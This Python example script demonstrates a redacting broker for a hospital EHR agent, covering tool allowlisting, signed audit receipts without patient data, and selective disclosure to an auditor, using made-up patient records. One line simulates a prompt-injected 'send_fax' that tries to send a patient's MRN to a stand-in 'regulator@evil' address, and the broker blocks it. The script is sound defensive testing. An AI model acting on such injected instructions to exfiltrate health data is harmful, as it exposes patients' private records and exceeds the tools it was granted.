"""Redaction-by-default: an EHR agent whose receipt binds the run bit-for-bit yet
carries ZERO patient data. PHI stays in an org-held vault inside the hospital
boundary; an auditor gets ONE event plus an inclusion proof, and a doctored
disclosure is caught by the commitment.

Run: python examples/redact_demo.py   (no model or network needed)
"""
import os, sys, json
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
from vitnify.events import EventLog
from vitnify.certificate import issue_certificate, verify_authorized, gen_ed25519
from vitnify.redact import RedactingBroker, Vault, disclose, verify_disclosure, cleartext_leak

# Two patients' PHI -- exactly what must NOT end up in a shared, signed receipt.
PHI   = {"mrn": "44-19-8823", "name": "Jane A. Doe",    "dob": "1971-03-14", "dx": "E11.9"}
OTHER = {"mrn": "88-02-4471", "name": "John Q. Public", "dob": "1965-11-02", "dx": "I10"}

def ehr_lookup(mrn):   return {"mrn": mrn, "status": "active"}
def summarize(text):   return "summary generated"

log, vault = EventLog(), Vault()
# GRANTED: read the record + summarize. NOT granted: any external send (the exfil wall).
broker = RedactingBroker(["ehr_lookup", "summarize"],
                         {"ehr_lookup": ehr_lookup, "summarize": summarize}, log, vault)

# the agent runs -- on real PHI, for two patients
broker.call("ehr_lookup", PHI["mrn"])                              # event 0
broker.call("summarize", f"{PHI['name']} {PHI['dob']} {PHI['dx']}")  # event 1
broker.call("ehr_lookup", OTHER["mrn"])                            # event 2
# a prompt injection tries to exfiltrate PHI -> BLOCKED, and its argument is redacted too
sent, _ = broker.call("send_fax", PHI["mrn"], "regulator@evil")   # event 3

priv, pub = gen_ed25519()
cert, _ = issue_certificate("sha256:ehr-agent-v3", ["ehr_lookup", "summarize"], log, priv=priv)
v = verify_authorized(cert, log, pinned_pubkeys=[pub])

print("== redaction-by-default ==")
print("blocked exfil attempt         :", sent is False)
print("level-1 ok                    :", v["ok"])
print("containment_enforced          :", v["containment_enforced"])
needles = list(PHI.values()) + list(OTHER.values())
print("PHI strings in transcript     :", cleartext_leak(log, needles) or "NONE")

print("\n== selective disclosure: auditor asks about ONE patient (event 0) ==")
root = cert.event_root
d = disclose(log, vault, 0)                 # reveal only patient-1's lookup
r = verify_disclosure(d, root)
print("event is in the signed root   :", r["in_root"])
print("revealed cleartext binds      :", r["ok"])
print("revealed argument             :", d["reveal"]["args"])
print("other patient exposed?        :", OTHER["mrn"] in json.dumps(d))

print("\n== a doctored disclosure is caught ==")
bad = json.loads(json.dumps(d))
bad["reveal"]["args"] = [OTHER["mrn"]]      # claim a different MRN for this event
print("doctored disclosure verifies? :", verify_disclosure(bad, root)["ok"], "(must be False)")
